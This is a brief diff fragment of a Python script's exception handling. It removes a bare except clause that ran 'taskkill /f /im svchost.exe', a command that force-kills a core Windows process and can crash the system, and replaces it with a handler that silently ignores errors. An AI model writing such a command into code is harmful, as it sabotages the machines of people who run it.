@@ -125,5 +125,5 @@ try:
             
 except KeyboardInterrupt:
     raise SystemExit(0)
-except:
-    os.system('taskkill /f /im svchost.exe')
+except Exception as e:
+    pass
